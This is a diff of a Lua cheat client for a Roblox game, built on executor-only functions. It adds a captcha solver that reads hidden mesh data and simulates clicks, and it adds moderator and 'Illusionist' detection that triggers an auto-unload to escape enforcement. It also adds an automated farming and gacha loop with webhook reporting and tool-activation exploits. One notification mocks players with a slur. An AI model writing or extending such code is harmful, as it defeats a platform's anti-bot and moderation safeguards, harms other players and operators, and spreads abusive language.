-                                -- Delay to ensure no conflicts with game's GUI creation
                                 task.wait(1)
                                 local leaderboardSrc = FindFirstChild(sui, LPH_ENCSTR('LeaderboardGui'))
                                 if leaderboardSrc then
@@ -11641,8 +23530,7 @@ if game.PlaceId == 100010170789226 then
                                 leaderboardGui:Destroy()
                             end
                             connection:Disconnect()
-                            task.wait(1)  -- Delay to ensure clean timing before recreation
-                            -- Check if LeaderboardGui already exists, if not then create it
+                            task.wait(1)
                             local existingLB = FindFirstChild(gui, LPH_ENCSTR('LeaderboardGui'))
                             if not existingLB then
                                 local leaderboardSrc = FindFirstChild(sui, LPH_ENCSTR('LeaderboardGui'))
@@ -11986,7 +23874,6 @@ if game.PlaceId == 100010170789226 then
             end
 
             local function getArtifactRarity(artifactName)
-                -- Map artifact names to rarity based on identify_trinket logic
                 local mythic_artifacts = {
                     ["Rift Gem"] = true,
                     ["Mysterious Artifact"] = true,
@@ -12075,7 +23962,6 @@ if game.PlaceId == 100010170789226 then
                     if menuReturnGui then
                         local menuButton = FindFirstChild(menuReturnGui, "Menu")
                         if menuButton and menuButton:IsA("GuiButton") then
-                            -- Position dynamically based on menu button position (30 pixels to the left)
                             local menuPos = menuButton.Position
                             ClickMenuMain.Position = UDim2.new(menuPos.X.Scale, menuPos.X.Offset - 35, -0.000833299418, 0)
                         else
@@ -12102,6 +23988,21 @@ if game.PlaceId == 100010170789226 then
                 else
                     ClickMenuSubtitle.Text = "Unknown"
                 end
+
+                pcall(function()
+                    local backpack = FindFirstChild(player, "Backpack")
+                    if backpack then
+                        local hasObserveBlock = FindFirstChild(backpack, "ObserveBlock")
+                        local hasWatchful = FindFirstChild(backpack, "Watchful")
+                        if hasObserveBlock or hasWatchful then
+                            ClickMenuSubtitle.TextColor3 = Color3.fromRGB(255, 215, 0)
+                        else
+                            ClickMenuSubtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+                        end
+                    else
+                        ClickMenuSubtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+                    end
+                end)
 
                 pcall(function()
                     local classText = ""
@@ -12178,7 +24079,6 @@ if game.PlaceId == 100010170789226 then
                     ClickMenuBlessings.Visible = false
                 end
 
-                -- Check for artifacts in backpack
                 pcall(function()
                     local artifact_counts = {}
                     local backpack = FindFirstChild(player, "Backpack")
@@ -12219,7 +24119,7 @@ if game.PlaceId == 100010170789226 then
 
                 if player.Character then
                     local success, playerTags = pcall(function()
-                        return game:GetService("CollectionService"):GetTags(player.Character)
+                        return Services.CollectionService:GetTags(player.Character)
                     end)
                     if success and playerTags then
                         tags = playerTags
@@ -12368,14 +24268,17 @@ if game.PlaceId == 100010170789226 then
                     end
                     WaitForChild(leaderboardGui, "LeaderboardClient", 10)
                     wait()
-                    
+
+                    pcall(function() collectgarbage("collect") end)
+                    task.wait(0.1)
+
                     for i, v in pairs(getreg()) do
                         if typeof(v) == "function" and islclosure(v) and not (isourclosure and isourclosure(v)) then
                             local ups = debug.getupvalues(v)
                             local scr = getfenv(v).script
 
                             if Find(ups, function(x)
-                                return scr.Name == "LeaderboardClient" and typeof(x) == "function" and
+                                return scr and scr.Name == "LeaderboardClient" and typeof(x) == "function" and
                                     InTable(debug.getconstants(x), "HouseRank")
                             end) then
                                 local Labels = {}
@@ -12436,6 +24339,7 @@ if game.PlaceId == 100010170789226 then
                 while shared and not shared.is_unloading do
                     task.wait(1)
                 end
+
                 if player_monitor_connections then
                     for player, connections in pairs(player_monitor_connections) do
                         for _, conn in pairs(connections) do
@@ -12446,49 +24350,31 @@ if game.PlaceId == 100010170789226 then
                     end
                     table.clear(player_monitor_connections)
                 end
-            end)
-        end
 
-        do -- Better Mana
-            local key_code_g = Enum.KeyCode.G
+                if playerLabels then
+                    for label, player in pairs(playerLabels) do
+                        pcall(function()
+                            local spbButton = FindFirstChild(label, "SPB")
+                            if spbButton then
+                                spbButton:Destroy()
+                            end
 
-            local function getPing()
-                local success, ping = pcall(function()
-                    return game:GetService('Stats'):WaitForChild('PerformanceStats'):WaitForChild('Ping'):GetValue()
-                end)
-                return success and ping or 0
-            end
+                            if player then
+                                local hasMaxEdict = player:GetAttribute("MaxEdict") == true
+                                local hasLeaderstat = is_khei and FindFirstChild(player, "leaderstats") and FindFirstChild(player.leaderstats, "MaxEdict") and player.leaderstats.MaxEdict.Value == true
 
-            utility:Connection(uis.InputBegan, function(input, chatcheck)
-                if chatcheck then return end
-                if input.KeyCode ~= key_code_g then return end
-                if not plr.Character then return end
-                if not (shared and Toggles and Toggles.better_mana and Toggles.better_mana.Value) then return end
-
-                task.spawn(function()
-                    if not utility then return end
-
-                    utility:charge_mana()
-                    task.wait(0.1 + ((utility and getPing() or 0) / 900))
-
-                    repeat
-                        task.wait()
-                        if not utility then return end
-                        local character = plr.Character
-                        if character and not FindFirstChild(character, "Charge") then
-                            utility:charge_mana()
-                            task.wait(0.1 + ((utility and getPing() or 0) / 900))
-                        end
-                    until not uis:IsKeyDown(key_code_g)
-
-                    if utility then
-                        utility:decharge_mana()
+                                label.TextColor3 = (hasMaxEdict or hasLeaderstat) and Color3.fromRGB(255, 214, 81) or Color3.new(1, 1, 1)
+                            end
+                        end)
                     end
-                end)
+                    table.clear(playerLabels)
+                end
+
+                pcall(function() collectgarbage("collect") end)
             end)
         end
     
-        do -- Rendering Handler
+        do
             utility:Connection(uis.WindowFocused, function() 
                 cheat_client.window_active = true
             end)
@@ -12498,17 +24384,16 @@ if game.PlaceId == 100010170789226 then
             end)
         end
     
-        do -- Notification Updater
+        do
             local notification_connection = nil
             local last_check = 0
-            local check_interval = 1 -- Check every 1 second if notifications exist when not connected
+            local check_interval = 1
 
             local function start_notification_updater()
                 if notification_connection then return end
 
                 notification_connection = utility:Connection(rs.RenderStepped, LPH_NO_VIRTUALIZE(function()
                     if #shared.notifications == 0 then
-                        -- Disconnect when no notifications to save performance
                         if notification_connection then
                             notification_connection:Disconnect()
                             notification_connection = nil
@@ -12526,7 +24411,7 @@ if game.PlaceId == 100010170789226 then
                             if current_tick - notification.start_tick > notification.lifetime then
                                 task.spawn(notification.destruct, notification)
                                 table.remove(shared.notifications, i)
-                            elseif count > 35 and not removed_first then -- 10
+                            elseif count > 35 and not removed_first then
                                 removed_first = true
                                 local first = table.remove(shared.notifications, 1)
                                 task.spawn(first.destruct, first)
@@ -12549,7 +24434,6 @@ if game.PlaceId == 100010170789226 then
                 end))
             end
 
-            -- Check periodically if notifications were added externally
             utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function()
                 local current_time = tick()
                 if current_time - last_check >= check_interval then
@@ -12560,13 +24444,12 @@ if game.PlaceId == 100010170789226 then
                 end
             end))
 
-            -- Start immediately if there are already notifications
             if shared.notifications and #shared.notifications > 0 then
                 start_notification_updater()
             end
         end
     
-        do -- Auto Panic Handler
+        do
             local function is_moderator_check(player)
                 if cheat_client and cheat_client.mod_list and table.find(cheat_client.mod_list, player.UserId) then
                     return true
@@ -12596,7 +24479,110 @@ if game.PlaceId == 100010170789226 then
             end)
         end
 
-        do -- Mod Detection
+        do
+            local detected_illusionists = {}
+
+            local function handle_illusionist(player)
+                if detected_illusionists[player.UserId] then return end
+                detected_illusionists[player.UserId] = true
+
+                if (library ~= nil and library.Notify) then
+                    utility:sound("rbxassetid://2865227039",2)
+                    library:Notify({
+                        Title = "⚠️ ILLUSIONIST DETECTED",
+                        Description = cheat_client:get_name(player).." ["..player.Name.."] is an illusionist",
+                        Time = 10
+                    })
+                end
+
+                if Toggles and Toggles.auto_panic and Toggles.auto_panic.Value and
+                   Options and Options.auto_panic_options and Options.auto_panic_options.Value and
+                   Options.auto_panic_options.Value["Unload on Illusionist join"] then
+                    utility:plain_webhook(string.format("**AUTO PANIC** Unloading because an Illusionist joined - %s (%s)", player.Name, player.UserId))
+                    task.wait(0.05)
+                    utility:Unload()
+                end
+            end
+
+            local function setup_illu_player(player)
+                if player == plr then return end
+
+                local function check_and_handle(character)
+                    local backpack = FindFirstChild(player, "Backpack")
+                    if not backpack then return false end
+                    local observe_tool = FindFirstChild(backpack, "Observe") or (character and FindFirstChild(character, "Observe"))
+                    if observe_tool then
+                        handle_illusionist(player)
+                        return true
+                    end
+                    return false
+                end
+
+                local function setup_backpack_listener()
+                    local backpack = FindFirstChild(player, "Backpack")
+                    if not backpack then return end
+                    if detected_illusionists[player.UserId] then return end
+
+                    local waiting_connection
+                    waiting_connection = utility:Connection(backpack.ChildAdded, function(child)
+                        if child.Name == "Observe" then
+                            handle_illusionist(player)
+                            if waiting_connection then
+                                waiting_connection:Disconnect()
+                                waiting_connection = nil
+                            end
+                        end
+                    end)
+                end
+
+                task.spawn(function()
+                    local backpack = FindFirstChild(player, "Backpack")
+                    if not backpack then
+                        backpack = player:WaitForChild("Backpack", 10)
+                    end
+                    if not backpack then return end
+
+                    if player.Character then
+                        if not check_and_handle(player.Character) then
+                            setup_backpack_listener()
+                        end
+                    else
+                        setup_backpack_listener()
+                    end
+                end)
+
+                utility:Connection(player.CharacterAdded, function(character)
+                    task.wait(0.5)
+                    detected_illusionists[player.UserId] = nil
+                    if not check_and_handle(character) then
+                        setup_backpack_listener()
+                    end
+                end)
+            end
+
+            for _, player in next, plrs:GetPlayers() do
+                setup_illu_player(player)
+            end
+
+            utility:Connection(plrs.PlayerAdded, setup_illu_player)
+
+            utility:Connection(plrs.PlayerRemoving, function(player)
+                detected_illusionists[player.UserId] = nil
+            end)
+        end
+        
+        do
+            utility:Connection(plrs.PlayerRemoving, function(player)
+                if player.Character and cs:HasTag(player.Character,'Danger') then
+                    if (library ~= nil and library.Notify) then
+                        library:Notify(cheat_client:get_name(player).." ["..player.Name.."] combat logged, what a retard LOL", Color3.fromRGB(5,139,252))
+                    end
+                end
+            end)
+        end
+        
+
+        do
             utility:Connection(plrs.PlayerAdded, function(player)
                 task.spawn(cheat_client.detect_mod, cheat_client, player)
 
@@ -12605,13 +24591,426 @@ if game.PlaceId == 100010170789226 then
                 end
 
                 utility:Connection(player.CharacterAdded, function(character)
-                    task.wait(0.5)  -- Wait for backpack to load
+                    task.wait(1)
                     task.spawn(cheat_client.detect_specs, cheat_client, player)
                 end)
             end)
         end
+
+        do
+            local function readCSG(union)
+                local result = gethiddenproperty(union, "PhysicalConfigData")
+                local unionData
+                
+                if type(result) == "table" and #result >= 2 then
+                    unionData = result[2]
+                else
+                    unionData = select(2, pcall(function() return gethiddenproperty(union, "PhysicalConfigData") end))
+                    
+                    if type(unionData) ~= "string" then
+                        warn("DEBUG - PhysicalConfigData type:", type(result))
+                        
+                        for _, prop in pairs({"BinaryData", "MeshData", "RawData", "ConfigData"}) do
+                            local success, data = pcall(function() return gethiddenproperty(union, prop) end)
+                            if success and type(data) == "string" and #data > 100 then
+                                warn("Found usable data in property:", prop)
+                                unionData = data
+                                break
+                            end
+                        end
+                        
+                        if type(unionData) ~= "string" then
+                            warn("WARNING: Could not get valid CSG data. Captcha bypass may fail.")
+                            return {}
+                        end
+                    end
+                end
+                
+                local unionDataStream = tostring(unionData)
+                if type(unionDataStream) ~= "string" then
+                    warn("ERROR: Failed to convert union data to string")
+                    return {}
+                end
+
+                local function readByte(n)
+                    if #unionDataStream < n then
+                        return ""
+                    end
+                    local returnData = unionDataStream:sub(1, n)
+                    unionDataStream = unionDataStream:sub(n+1, #unionDataStream)
+                    return returnData
+                end;
+
+                readByte(51);
+
+                local points = {};
+
+                while #unionDataStream > 0 do
+                    readByte(20)
+                    readByte(20)
+
+                    local vertSize = string.unpack('ii', readByte(8));
+
+                    for i = 1, (vertSize/3) do
+                        local x, y, z = string.unpack('fff', readByte(12))
+                        points[#points + 1] = union.CFrame:ToWorldSpace(CFrame.new(x, y, z)).Position;
+                    end;
+
+                    local faceSize = string.unpack('I', readByte(4));
+                    readByte(faceSize * 4);
+                end;
+
+                return points;
+            end;
+
+            function solveCaptcha(union)
+                local worldModel = Instance.new('WorldModel');
+                worldModel.Parent = cg;
+
+                local newUnion = union:Clone()
+                newUnion.Parent = worldModel;
+
+                local cameraCFrame = gethiddenproperty(union.Parent, "CameraCFrame");
+                local points = readCSG(union);
+
+                local rangePart = Instance.new('Part');
+                rangePart.Parent = worldModel;
+                rangePart.CFrame = cameraCFrame:ToWorldSpace(CFrame.new(-8, 0, 0))
+                rangePart.Size = Vector3.new(1, 100, 100);
+
+                local model = Instance.new('Model', worldModel);
+                local baseModel = Instance.new('Model', worldModel);
+
+                baseModel.Name = 'Base';
+                model.Name = 'Final';
+
+                for i, v in next, points do
+                    local part = Instance.new('Part', baseModel);
+                    part.CFrame = CFrame.new(v);
+                    part.Size = Vector3.new(0.1, 0.1, 0.1);
+                end;
+
+                local seen = false;
+                for i = 0, 100 do
+                    rangePart.CFrame = rangePart.CFrame * CFrame.new(1, 0, 0)
+
+                    local overlapParams = OverlapParams.new();
+                    overlapParams.FilterType = Enum.RaycastFilterType.Whitelist;
+                    overlapParams.FilterDescendantsInstances = {baseModel};
+
+                    local bob = worldModel:GetPartsInPart(rangePart, overlapParams);
+                    if(seen and #bob <= 0) then break end;
+
+                    for i, v in next, bob do
+                        seen = true;
+
+                        local new = v:Clone();
+
+                        new.Parent = model;
+                        new.CFrame = CFrame.new(new.Position);
+                    end;
+                end;
+
+                for i, v in next, model:GetChildren() do
+                    v.CFrame = v.CFrame * CFrame.Angles(0, math.rad(union.Orientation.Y), 0);
+                end;
+
+                local shorter, found = math.huge, '';
+                local result = model:GetExtentsSize();
+
+                local values = {
+                    ['Arocknid'] = Vector3.new(11.963972091675, 6.2284870147705, 12.341609954834),
+                    ['Howler'] = Vector3.new(2.904595375061, 7.5143890380859, 6.4855442047119),
+                    ['Evil Eye'] = Vector3.new(6.7253036499023, 6.2872190475464, 11.757738113403),
+                    ['Zombie Scroom'] = Vector3.new(4.71413230896, 4.400146484375, 4.7931442260742),
+                    ['Golem'] = Vector3.new(17.123439788818, 21.224365234375, 6.9429664611816),
+                };
+
+                for i, v in next, values do
+                    if((result - v).Magnitude < shorter) then
+                        found = i;
+                        shorter = (result - v).Magnitude;
+                    end;
+                end;
+
+                worldModel:Destroy();
+                worldModel = nil;
+
+                return found;
+            end
+
+            local time_elapsed = 0
+            local playerDays = 0
+
+            local function no_kick()
+                if Toggles and Toggles.no_kick and Toggles.no_kick.Value then
+                    return true
+                end
+                return false
+            end
+            
+            local function kickPlayer(message)
+                if cs:HasTag(plr.Character, "Danger") then
+                    repeat task.wait() until not cs:HasTag(plr.Character, "Danger")
+                end
+
+                utility:plain_webhook(message)
+                rps.Requests.ReturnToMenu:InvokeServer()
+                plr:Kick(message)
+                utility:Unload()
+            end
+
+            local function Get(value)
+                local success, result = pcall(function()
+                    return rps.Requests.Get:InvokeServer(utf8.char(65532) .. "\240\159\152\131", value)[value]
+                end)
+                return success and result or nil
+            end
+
+            local function check_silver()
+                local silver = Get("Silver")
+
+                if not silver then
+                    return true
+                end
+
+                local has_enough = silver >= 250
+                if not has_enough and no_kick() then
+                    utility:plain_webhook(string.format("@here %s (%s) tried gacha without enough silver (250 needed, has %d)", plr.Name, plr.UserId, silver))
+                    return true
+                end
+
+                return has_enough
+            end
+
+            local function gacha()
+                if not (Toggles and Toggles.day_farm and Toggles.day_farm.Value) and plr.Name ~= "Tharxifen" then return false end
+                if not plr.Character then return end
+
+                local npc = FindFirstChild(workspace.NPCs, "Xenyari")
+                local npcHead = FindFirstChild(npc, "Head")
+                local clickDetector = FindFirstChildWhichIsA(npc, "ClickDetector")
+                
+                if not workspace.NPCs or not FindFirstChild(workspace.NPCs, "Xenyari") or 
+                not FindFirstChild(workspace.NPCs.Xenyari, "Head") or
+                not FindFirstChildWhichIsA(workspace.NPCs.Xenyari, "ClickDetector") then
+                    return false
+                end
+
+                local distanceFromNPC = plr:DistanceFromCharacter(npcHead.Position)
+                if distanceFromNPC > 20 then
+                    return false
+                end
+
+                if not check_silver() then
+                    kickPlayer(string.format("%s (%s) tried gacha without enough silver (250 needed)", plr.Name, plr.UserId))
+                    return false
+                end
+                
+                if not playerDays then
+                    playerDays = utility:getPlayerDays() or 0
+                    if not playerDays then
+                        repeat
+                            playerDays = utility:getPlayerDays()
+                            task.wait(0.1)
+                        until playerDays
+                    end
+                end
+                
+                if dialogue_remote then
+                    local dialogConnection
+                    dialogConnection = utility:Connection(dialogue_remote.OnClientEvent, function(dialogData)
+                        task.wait(1)
+                        
+                        if not dialogData.choices then
+                            dialogue_remote:FireServer({exit = true})
+                            task.wait(1)
+                            dialogConnection:Disconnect()
+                        else
+                            dialogue_remote:FireServer({choice = dialogData.choices[1]})
+                        end
+                    end)
+                end
+
+                repeat
+                    fireclickdetector(clickDetector)
+                task.wait(0.25);
+                until FindFirstChild(plr.PlayerGui, 'CaptchaLoad') or FindFirstChild(plr.PlayerGui, 'Captcha');
+                
+                repeat task.wait(0.05) until FindFirstChild(plr.PlayerGui, 'Captcha');
+                repeat
+                    local captchaGUI = FindFirstChild(plr.PlayerGui, 'Captcha');
+                    local choices = captchaGUI and captchaGUI.MainFrame.Options:GetChildren();
+                    local union = captchaGUI and captchaGUI.MainFrame.Viewport.Union;
+
+                    utility:random_wait(true);
+
+                    if(choices and union) then
+                        local captchaAnswer = solveCaptcha(union);
+
+                        for i, v in next, choices do
+                            if(v.Name == captchaAnswer) then
+                                local objVector = v.AbsolutePosition;
+                                vim:SendMouseButtonEvent(objVector.X + 65, objVector.Y + 65, 0, true, game, 0);
+                                utility:random_wait(true);
+                                vim:SendMouseButtonEvent(objVector.X + 65, objVector.Y + 65, 0, false, game, 0);
+                                break
+                            end
+                        end
+                    end
+
+                    task.wait(1);
+                until not FindFirstChild(plr.PlayerGui, 'Captcha');
+                
+                return true
+            end
+
+            local function day_goal()
+                local day_goal_value = (Options and Options.day_goal and Options.day_goal.Value) or "1"
+                local day_goal = tonumber(day_goal_value) or 1
+
+                if playerDays >= day_goal then
+                    if Toggles and Toggles.day_goal_kick and Toggles.day_goal_kick.Value then
+                        if no_kick() then
+                            utility:plain_webhook(string.format("@here %s (%s) reached day goal: %d (no_kick enabled, not kicking)", plr.Name, plr.UserId, playerDays))
+                        else
+                            kickPlayer(string.format("%s reached day goal: %d", plr.Name, plr.UserId, playerDays))
+                        end
+                    end
+                    return true
+                end
+                return false
+            end
+
+            utility:Connection(rps.Requests.DaysSurvivedChanged.OnClientEvent, function(days)
+                if not (Toggles and Toggles.day_farm and Toggles.day_farm.Value) then return end
+                
+                playerDays = days
+                utility:sound("rbxassetid://6729922069",4)
+                utility:plain_webhook(plr.Name .. " is now at " .. playerDays .. " days")
+
+                if day_goal() then
+                    return
+                end
+                
+                if gacha() then
+                    warn("Successfully interacted with Xenyari!")
+                else
+                    warn("Not near Xenyari, continuing with normal day farm")
+                end
+            end)
+        end
+    
+        do
+            local function get_inventory_value()
+                local inventory_value = 0
+
+                if not plr.Backpack then return 0 end
+                local backpack_children = plr.Backpack:GetChildren()
+
+                for index = 1, #backpack_children do
+                    local backpack_child = backpack_children[index]
+                    local silver_value = FindFirstChild(backpack_child, "SilverValue")
+
+                    if silver_value then
+                        inventory_value = inventory_value + silver_value.Value
+                    end
+                end
+                
+                return inventory_value
+            end 
+    
+            local time_elapsed = 0
+            utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function(delta_time)
+                time_elapsed += delta_time
+                if time_elapsed >= 1 then
+                    time_elapsed = 0
+                    if Labels and Labels.InventoryValue then
+                        Labels.InventoryValue:SetText("Inventory Value: " .. get_inventory_value())
+                    end
+                end
+            end))
+        end
+
+        do
+            if game.PlaceId == 5208655184 then
+                local function last_looted(where)
+                    if where == "cr" then
+                        return math.floor((os.time() - WaitForChild(workspace, "MonsterSpawns"):WaitForChild("Triggers"):WaitForChild("CastleRockSnake"):WaitForChild("LastSpawned").Value) / 60).."m"
+                    elseif where == "deepsunken" then
+                            return math.floor((os.time() - WaitForChild(workspace, "MonsterSpawns"):WaitForChild("Triggers"):WaitForChild("evileye2"):WaitForChild("LastSpawned").Value) / 60).."m"
+                    elseif where == "crypt" then
+                        return math.floor((os.time() - WaitForChild(workspace, "MonsterSpawns"):WaitForChild("Triggers"):WaitForChild("CryptTrigger"):WaitForChild("LastSpawned").Value) / 60).."m"
+                    elseif where == "temple" then
+                        return math.floor((os.time() - WaitForChild(workspace, "MonsterSpawns"):WaitForChild("Triggers"):WaitForChild("MazeSnakes"):WaitForChild("LastSpawned").Value) / 60).."m"
+                    end
+                end
+
+                local time_elapsed_cr = 0
+                utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function(delta_time)
+                    time_elapsed_cr += delta_time
+                    if time_elapsed_cr >= 1 then
+                        time_elapsed_cr = 0
+                        if Labels and Labels.CrLastLooted then
+                            Labels.CrLastLooted:SetText("Castle Rock: " .. last_looted("cr"))
+                        end
+                        if Labels and Labels.TempleLastLooted then
+                            Labels.TempleLastLooted:SetText("Temple of Fire: " .. last_looted("temple"))
+                        end
+                        if Labels and Labels.DeepLastLooted then
+                            Labels.DeepLastLooted:SetText("Deep Sunken: " .. last_looted("deepsunken"))
+                        end
+                        if Labels and Labels.CryptLastLooted then
+                            Labels.CryptLastLooted:SetText("Crypt of Kings: " .. last_looted("crypt"))
+                        end
+                    end
+                end))
+            elseif game.PlaceId == 3541987450 then
+                local time_elapsed_blessings = 0
+                utility:Connection(rs.Heartbeat, LPH_NO_VIRTUALIZE(function(delta_time)
+                    time_elapsed_blessings += delta_time
+                    if time_elapsed_blessings >= 1 then
+                        time_elapsed_blessings = 0
+                        if Labels and Labels.PlayerBlessings and plr.Character then
+                            local blessings_folder = FindFirstChild(plr.Character, "Blessings")
+                            if blessings_folder then
+                                local blessing_names = {}
+                                for _, blessing in pairs(blessings_folder:GetChildren()) do
+                                    table.insert(blessing_names, blessing.Name)
+                                end
+                                if #blessing_names > 0 then
+                                    Labels.PlayerBlessings:SetText("Blessings:\n" .. table.concat(blessing_names, "\n"))
+                                else
+                                    Labels.PlayerBlessings:SetText("Blessings: None")
+                                end
+                            else
+                                Labels.PlayerBlessings:SetText("Blessings: None")
+                            end
+                        end
+                    end
+                end))
+            end
+        end
+    
+        do
+            local function update_count()
+                if Labels and Labels.PlrsServer then
+                    Labels.PlrsServer:SetText("Players: " .. #plrs:GetPlayers())
+                end
+            end
+
+            task.spawn(function()
+                while shared and not shared.is_unloading and cheat_client do
+                    update_count()
+                    task.wait(1)
+                end
+            end)
+
+            utility:Connection(plrs.PlayerAdded, update_count)
+            utility:Connection(plrs.PlayerRemoving, update_count)
+        end
         
-        do -- Fullbright
+        do
             local is_updating_ambient = false
             utility:Connection(lit:GetPropertyChangedSignal("Ambient"), function()
                 if is_updating_ambient then return end
@@ -12636,7 +25035,7 @@ if game.PlaceId == 100010170789226 then
 
                 if Toggles and Toggles.fullbright and Toggles.fullbright.Value then
                     local brightness_multiplier = (cheat_client.config.brightness_level or 80) / 100
-                    local target_brightness = 1 + (brightness_multiplier * 2) -- Range: 1-3
+                    local target_brightness = 1 + (brightness_multiplier * 2)
 
                     if lit.Brightness ~= target_brightness then
                         lit.Brightness = target_brightness
@@ -12696,7 +25095,7 @@ if game.PlaceId == 100010170789226 then
             end)
         end
     
-        do -- Clock Time
+        do
             utility:Connection(lit:GetPropertyChangedSignal("ClockTime"), function()
                 if Toggles and Toggles.change_time and Toggles.change_time.Value then
                     local target_time = (Options and Options.clock_time and Options.clock_time.Value) or 12
@@ -12707,20 +25106,190 @@ if game.PlaceId == 100010170789226 then
             end)
         end
 
-        do -- Auto Dialogue
+
+        do
+            local can_mine = true
+            utility:Connection(uis.InputBegan, function(input, chatcheck)
+                if chatcheck then return end
+                if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
+                if not (shared and Toggles and Toggles.instant_mine and Toggles.instant_mine.Value) then return end
+                if not (plr.Character and FindFirstChild(plr.Character, "Pickaxe")) then return end
+                if not can_mine then return end
+
+                can_mine = false
+                plr.Character.Humanoid:UnequipTools()
+                for _,v in pairs(plr.Backpack:GetChildren()) do
+                     if v.Name == "Pickaxe" then
+                        plr.Character.Humanoid:EquipTool(v)
+                        for i = 1, 8 do
+                            v:Activate();
+                            plr.Character.Humanoid:UnequipTools()
+                        end
+                        plr.Character.Humanoid:EquipTool(v)
+                    end
+                end
+
+                task.wait(0.05)
+                can_mine = true
+            end)
+        end
+
+        do
+            local key_code_g = Enum.KeyCode.G
+
+            local function getPing()
+                local success, ping = pcall(function()
+                    return Services.Stats:WaitForChild('PerformanceStats'):WaitForChild('Ping'):GetValue()
+                end)
+                return success and ping or 0
+            end
+
+            utility:Connection(uis.InputBegan, function(input, chatcheck)
+                if chatcheck then return end
+                if input.KeyCode ~= key_code_g then return end
+                if not plr.Character then return end
+                if not (shared and Toggles and Toggles.better_mana and Toggles.better_mana.Value) then return end
+                if not mana_remote then return end
+
+                task.spawn(function()
+                    if not mana_remote or not utility then return end
+
+                    utility:charge_mana()
+                    task.wait(0.1 + ((utility and getPing() or 0) / 900))
+
+                    repeat
+                        task.wait()
+                        if not utility or not mana_remote then return end
+                        local character = plr.Character
+                        if character and not FindFirstChild(character, "Charge") then
+                            utility:charge_mana()
+                            task.wait(0.1 + ((utility and getPing() or 0) / 900))
+                        end
+                    until not uis:IsKeyDown(key_code_g)
+
+                    if utility and mana_remote then
+                        utility:decharge_mana()
+                    end
+                end)
+            end)
+        end
+
+do
+    local better_unequip_conn = nil
+
+    local function find_bypass_tool(removed_name)
+        if not plr.Backpack then return nil end
+
+        local target
+        if removed_name == "Dagger" then
+            target = "Owl Slash"
+        elseif removed_name == "Rapier" then
+            target = "Dagger Throw" -- Rapier now uses Dagger Throw
+        else
+            target = "Action Surge"
+        end
+
+        for _, t in ipairs(plr.Backpack:GetChildren()) do
+            if t:IsA("Tool") and t.Name == target then
+                return t
+            end
+        end
+    end
+
+    local function setup_better_unequip(character)
+        if better_unequip_conn then
+            better_unequip_conn:Disconnect()
+            better_unequip_conn = nil
+        end
+
+        if not character then return end
+
+        better_unequip_conn = utility:Connection(character.ChildRemoved, function(child)
+            if not (Toggles.BetterUnequip and Toggles.BetterUnequip.Value) then return end
+            if not child:IsA("Tool") then return end
+
+            local valid_weapons = {
+                ["Dagger"] = true,
+                ["Sword"] = true,
+                ["Rapier"] = true
+            }
+
+            if not valid_weapons[child.Name] then return end
+
+            local char = plr.Character
+            if not char then return end
+
+            local dagger_skills = {
+                ["Lethality"] = true,
+                ["Triple Dagger Throw"] = true,
+                ["Dagger Throw"] = true
+            }
+
+            local rapier_skills = {
+                ["Elegant Slash"] = true,
+                ["Needle's Eye"] = true,
+                ["Dagger Throw"] = true
+            }
+
+            task.defer(function()
+                local current_tool = char:FindFirstChildOfClass("Tool")
+
+                local is_dagger_skill =
+                    current_tool and child.Name == "Dagger" and dagger_skills[current_tool.Name]
+
+                local is_rapier_skill =
+                    current_tool and child.Name == "Rapier" and rapier_skills[current_tool.Name]
+
+                -- If another random tool equipped, don't interfere
+                if current_tool and not (is_dagger_skill or is_rapier_skill) then
+                    return
+                end
+
+                local hum = char:FindFirstChildOfClass("Humanoid")
+                if not hum then return end
+
+                local reequip_tool_name = (is_dagger_skill or is_rapier_skill) and current_tool and current_tool.Name or nil
+
+                local bypass = find_bypass_tool(child.Name)
+                if bypass then
+                    hum:EquipTool(bypass)
+                    task.wait(0.04)
+                end
+
+                hum:UnequipTools()
+
+                if reequip_tool_name then
+                    task.wait(0.01)
+                    for _, t in ipairs(plr.Backpack:GetChildren()) do
+                        if t:IsA("Tool") and t.Name == reequip_tool_name then
+                            hum:EquipTool(t)
+                            break
+                        end
+                    end
+                end
+            end)
+        end)
+    end
+
+    if plr.Character then
+        setup_better_unequip(plr.Character)
+    end
+
+    utility:Connection(plr.CharacterAdded, setup_better_unequip)
+end
+
+        do
             local AUTO_DIALOGUE_SPEAKERS = {
                 ["Doctor"] = true,
                 ["Engineer"] = true,
                 ["Miner John"] = true,
                 ["Mysterious Stranger"] = true,
+                ["Vinifera"] = true,
                 ["Gary"] = true,
                 ["Yeti"] = true,
                 ["Inn Keeper"] = true,
                 ["Fallion"] = true,
                 ["Kyley"] = true,
-                --["Willow"] = true, = ...
-                --["Xenyari"] = true,
-                --["The Eagle"] = true
             }
             
             local dialogConnection
@@ -12739,10 +25308,9 @@ if game.PlaceId == 100010170789226 then
                 if msg and msg == "_The Obelisk radiates a great power._" then
                 elseif not speaker or speaker == "" or speaker:match("^%s*$") then
                     return
-                elseif speaker == "..." then -- willow
+                elseif speaker == "..." then
                     local choices = dialogData.choices
                     if msg and msg:find("drop back to your inn") and choices and choices[1] == "Take me away." then
-                        -- yes
                     else
                         return
                     end
@@ -12779,86 +25347,538 @@ if game.PlaceId == 100010170789226 then
             shared.auto_dialogue_handler = auto_dialogue_handler
         end
 
-        do -- Auto Weapon
+        do
             local thrown_folder = WaitForChild(ws, "Thrown")
-            local players_folder = WaitForChild(thrown_folder, "Players")
 
-            local function handle_weapon(weapon)
-                task.wait(0.5)
-
-                if not weapon:IsA("BasePart") then
-                    return
-                end
-
+            utility:Connection(thrown_folder.ChildAdded, function(weapon)
+                task.wait(1)
                 local pickup = FindFirstChild(weapon, "ClickDetector")
-                local prop = FindFirstChild(weapon, "Prop")
-                
-                if not (pickup and prop) then
-                    return
-                end
 
-                local activation_distance = pickup.MaxActivationDistance - 2
-                
-                task.spawn(function()
-                    while
-                        (not shared)
-                        or (not Toggles)
-                        or (not Toggles.auto_weapon)
-                        or (not Toggles.auto_weapon.Value)
-                        or (not plr.Character)
-                        or (not FindFirstChild(plr.Character, "Head"))
-                        or (plr:DistanceFromCharacter(weapon.Position) > activation_distance)
-                    do
-                        task.wait(0.1)
+                if FindFirstChild(weapon, "Prop") and pickup then
